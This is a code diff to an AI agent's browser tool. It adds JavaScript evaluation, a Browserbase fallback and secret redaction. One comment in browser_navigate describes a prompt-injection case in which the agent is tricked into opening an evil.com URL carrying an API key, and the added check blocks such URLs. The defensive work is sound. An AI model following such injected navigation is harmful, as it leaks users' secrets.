@@ -65,6 +65,7 @@ import requests
 from typing import Dict, Any, Optional, List
 from pathlib import Path
 from agent.auxiliary_client import call_llm
+from hermes_constants import get_hermes_home
 
 try:
     from tools.website_policy import check_website_access
@@ -78,6 +79,7 @@ except Exception:
 from tools.browser_providers.base import CloudBrowserProvider
 from tools.browser_providers.browserbase import BrowserbaseProvider
 from tools.browser_providers.browser_use import BrowserUseProvider
+from tools.tool_backend_helpers import normalize_browser_cloud_provider
 
 # Camofox local anti-detection browser backend (optional).
 # When CAMOFOX_URL is set, all browser operations route through the
@@ -143,7 +145,7 @@ def _get_command_timeout() -> int:
     ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.
     """
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         config_path = hermes_home / "config.yaml"
         if config_path.exists():
             import yaml
@@ -245,7 +247,9 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
     """Return the configured cloud browser provider, or None for local mode.
 
     Reads ``config["browser"]["cloud_provider"]`` once and caches the result
-    for the process lifetime.  If unset → local mode (None).
+    for the process lifetime. An explicit ``local`` provider disables cloud
+    fallback. If unset, fall back to Browserbase when direct or managed
+    Browserbase credentials are available.
     """
     global _cached_cloud_provider, _cloud_provider_resolved
     if _cloud_provider_resolved:
@@ -253,18 +257,62 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
 
     _cloud_provider_resolved = True
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         config_path = hermes_home / "config.yaml"
         if config_path.exists():
             import yaml
             with open(config_path) as f:
                 cfg = yaml.safe_load(f) or {}
-            provider_key = cfg.get("browser", {}).get("cloud_provider")
+            browser_cfg = cfg.get("browser", {})
+            provider_key = None
+            if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
+                provider_key = normalize_browser_cloud_provider(
+                    browser_cfg.get("cloud_provider")
+                )
+                if provider_key == "local":
+                    _cached_cloud_provider = None
+                    return None
             if provider_key and provider_key in _PROVIDER_REGISTRY:
                 _cached_cloud_provider = _PROVIDER_REGISTRY[provider_key]()
     except Exception as e:
         logger.debug("Could not read cloud_provider from config: %s", e)
+
+    if _cached_cloud_provider is None:
+        fallback_provider = BrowserbaseProvider()
+        if fallback_provider.is_configured():
+            _cached_cloud_provider = fallback_provider
+
     return _cached_cloud_provider
+
+
+def _get_browserbase_config_or_none() -> Optional[Dict[str, Any]]:
+    """Return Browserbase direct or managed config, or None when unavailable."""
+    return BrowserbaseProvider()._get_config_or_none()
+
+
+def _get_browserbase_config() -> Dict[str, Any]:
+    """Return Browserbase config or raise when neither direct nor managed mode is available."""
+    return BrowserbaseProvider()._get_config()
+
+
+def _is_local_mode() -> bool:
+    """Return True when the browser tool will use a local browser backend."""
+    if _get_cdp_override():
+        return False
+    return _get_cloud_provider() is None
+
+
+def _is_local_backend() -> bool:
+    """Return True when the browser runs locally (no cloud provider).
+
+    SSRF protection is only meaningful for cloud backends (Browserbase,
+    BrowserUse) where the agent could reach internal resources on a remote
+    machine.  For local backends — Camofox, or the built-in headless
+    Chromium without a cloud provider — the user already has full terminal
+    and network access on the same machine, so the check adds no security
+    value.
+    """
+    return _is_camofox_mode() or _get_cloud_provider() is None
 
 
 def _allow_private_urls() -> bool:
@@ -280,7 +328,7 @@ def _allow_private_urls() -> bool:
     _allow_private_urls_resolved = True
     _cached_allow_private_urls = False  # safe default
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         config_path = hermes_home / "config.yaml"
         if config_path.exists():
             import yaml
@@ -604,7 +652,7 @@ BROWSER_TOOL_SCHEMAS = [
     },
     {
         "name": "browser_console",
-        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first.",
+        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -612,6 +660,10 @@ BROWSER_TOOL_SCHEMAS = [
                     "type": "boolean",
                     "default": False,
                     "description": "If true, clear the message buffers after reading"
+                },
+                "expression": {
+                    "type": "string",
+                    "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
                 }
             },
             "required": []
@@ -730,7 +782,7 @@ def _find_agent_browser() -> str:
             extra_dirs.append(d)
     extra_dirs.extend(_discover_homebrew_node_dirs())
 
-    hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+    hermes_home = get_hermes_home()
     hermes_node_bin = str(hermes_home / "node" / "bin")
     if os.path.isdir(hermes_node_bin):
         extra_dirs.append(hermes_node_bin)
@@ -857,7 +909,7 @@ def _run_browser_command(
 
         # Ensure PATH includes Hermes-managed Node first, Homebrew versioned
         # node dirs (for macOS ``brew install node@24``), then standard system dirs.
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         hermes_node_bin = str(hermes_home / "node" / "bin")
 
         existing_path = browser_env.get("PATH", "")
@@ -1017,6 +1069,13 @@ def _extract_relevant_content(
             f"Provide a concise summary focused on interactive elements and key content."
         )
 
+    # Redact secrets from snapshot before sending to auxiliary LLM.
+    # Without this, a page displaying env vars or API keys would leak
+    # secrets to the extraction model before run_agent.py's general
+    # redaction layer ever sees the tool result.
+    from agent.redact import redact_sensitive_text
+    extraction_prompt = redact_sensitive_text(extraction_prompt)
+
     try:
         call_kwargs = {
             "task": "web_extract",
@@ -1028,7 +1087,9 @@ def _extract_relevant_content(
         if model:
             call_kwargs["model"] = model
         response = call_llm(**call_kwargs)
-        return (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
+        extracted = (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
+        # Redact any secrets the auxiliary LLM may have echoed back.
+        return redact_sensitive_text(extracted)
     except Exception:
         return _truncate_snapshot(snapshot_text)
 
@@ -1065,10 +1126,23 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    # Secret exfiltration protection — block URLs that embed API keys or
+    # tokens in query parameters. A prompt injection could trick the agent
+    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    from agent.redact import _PREFIX_RE
+    if _PREFIX_RE.search(url):
+        return json.dumps({
+            "success": False,
+            "error": "Blocked: URL contains what appears to be an API key or token. "
+                     "Secrets must not be sent in URLs.",
+        })
+
     # SSRF protection — block private/internal addresses before navigating.
-    # Can be opted out via ``browser.allow_private_urls`` in config for local
-    # development or LAN access use cases.
-    if not _allow_private_urls() and not _is_safe_url(url):
+    # Skipped for local backends (Camofox, headless Chromium without a cloud
+    # provider) because the agent already has full local network access via
+    # the terminal tool.  Can also be opted out for cloud mode via
+    # ``browser.allow_private_urls`` in config.
+    if not _is_local_backend() and not _allow_private_urls() and not _is_safe_url(url):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL targets a private or internal address",
@@ -1110,7 +1184,8 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         # Post-redirect SSRF check — if the browser followed a redirect to a
         # private/internal address, block the result so the model can't read
         # internal content via subsequent browser_snapshot calls.
-        if not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
+        # Skipped for local backends (same rationale as the pre-nav check).
+        if not _is_local_backend() and not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
             # Navigate away to a blank page to prevent snapshot leaks
             _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
             return json.dumps({
@@ -1415,19 +1490,26 @@ def browser_close(task_id: Optional[str] = None) -> str:
     return json.dumps(response, ensure_ascii=False)
 
 
-def browser_console(clear: bool = False, task_id: Optional[str] = None) -> str:
-    """Get browser console messages and JavaScript errors.
+def browser_console(clear: bool = False, expression: Optional[str] = None, task_id: Optional[str] = None) -> str:
+    """Get browser console messages and JavaScript errors, or evaluate JS in the page.
     
-    Returns both console output (log/warn/error/info from the page's JS)
-    and uncaught exceptions (crashes, unhandled promise rejections).
+    When ``expression`` is provided, evaluates JavaScript in the page context
+    (like the DevTools console) and returns the result.  Otherwise returns
+    console output (log/warn/error/info) and uncaught exceptions.
     
     Args:
         clear: If True, clear the message/error buffers after reading
+        expression: JavaScript expression to evaluate in the page context
         task_id: Task identifier for session isolation
         
     Returns:
-        JSON string with console messages and JS errors
+        JSON string with console messages/errors, or eval result
     """
+    # --- JS evaluation mode ---
+    if expression is not None:
+        return _browser_eval(expression, task_id)
+
+    # --- Console output mode (original behaviour) ---
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_console
         return camofox_console(clear, task_id)
@@ -1466,12 +1548,86 @@ def browser_console(clear: bool = False, task_id: Optional[str] = None) -> str:
     }, ensure_ascii=False)
 
 
+def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
+    """Evaluate a JavaScript expression in the page context and return the result."""
+    if _is_camofox_mode():
+        return _camofox_eval(expression, task_id)
+
+    effective_task_id = task_id or "default"
+    result = _run_browser_command(effective_task_id, "eval", [expression])
+
+    if not result.get("success"):
+        err = result.get("error", "eval failed")
+        # Detect backend capability gaps and give the model a clear signal
+        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
+            return json.dumps({
+                "success": False,
+                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
+            })
+        return json.dumps({
+            "success": False,
+            "error": err,
+        })
+
+    data = result.get("data", {})
+    raw_result = data.get("result")
+
+    # The eval command returns the JS result as a string.  If the string
+    # is valid JSON, parse it so the model gets structured data.
+    parsed = raw_result
+    if isinstance(raw_result, str):
+        try:
+            parsed = json.loads(raw_result)
+        except (json.JSONDecodeError, ValueError):
+            pass  # keep as string
+
+    return json.dumps({
+        "success": True,
+        "result": parsed,
+        "result_type": type(parsed).__name__,
+    }, ensure_ascii=False, default=str)
+
+
+def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
+    """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
+    from tools.browser_camofox import _get_session, _ensure_tab, _post
+    try:
+        session = _get_session(task_id or "default")
+        tab_id = _ensure_tab(session)
+        resp = _post(f"/tabs/{tab_id}/eval", json_data={"expression": expression})
+
+        # Camofox returns the result in a JSON envelope
+        raw_result = resp.get("result") if isinstance(resp, dict) else resp
+        parsed = raw_result
+        if isinstance(raw_result, str):
+            try:
+                parsed = json.loads(raw_result)
+            except (json.JSONDecodeError, ValueError):
+                pass
+
+        return json.dumps({
+            "success": True,
+            "result": parsed,
+            "result_type": type(parsed).__name__,
+        }, ensure_ascii=False, default=str)
+    except Exception as e:
+        error_msg = str(e)
+        # Graceful degradation — server may not support eval
+        if any(code in error_msg for code in ("404", "405", "501")):
+            return json.dumps({
+                "success": False,
+                "error": "JavaScript evaluation is not supported by this Camofox server. "
+                         "Use browser_snapshot or browser_vision to inspect page state.",
+            })
+        return json.dumps({"success": False, "error": error_msg})
+
+
 def _maybe_start_recording(task_id: str):
     """Start recording if browser.record_sessions is enabled in config."""
     if task_id in _recording_sessions:
         return
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         config_path = hermes_home / "config.yaml"
         record_enabled = False
         if config_path.exists():
@@ -1706,6 +1862,9 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         response = call_llm(**call_kwargs)
         
         analysis = (response.choices[0].message.content or "").strip()
+        # Redact secrets the vision LLM may have read from the screenshot.
+        from agent.redact import redact_sensitive_text
+        analysis = redact_sensitive_text(analysis)
         response_data = {
             "success": True,
             "analysis": analysis or "Vision analysis returned no content.",
@@ -1757,7 +1916,7 @@ def _cleanup_old_recordings(max_age_hours=72):
     """Remove browser recordings older than max_age_hours to prevent disk bloat."""
     import time
     try:
-        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        hermes_home = get_hermes_home()
         recordings_dir = hermes_home / "browser_recordings"
         if not recordings_dir.exists():
             return
@@ -1931,7 +2090,7 @@ if __name__ == "__main__":
             print("     Install: npm install -g agent-browser && agent-browser install --with-deps")
         if _cp is not None and not _cp.is_configured():
             print(f"   - {_cp.provider_name()} credentials not configured")
-            print("   Tip: remove cloud_provider from config to use free local mode instead")
+            print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")
     
     print("\n📋 Available Browser Tools:")
     for schema in BROWSER_TOOL_SCHEMAS:
@@ -2035,7 +2194,7 @@ registry.register(
     name="browser_console",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_console"],
-    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), task_id=kw.get("task_id")),
+    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
     emoji="🖥️",
 )
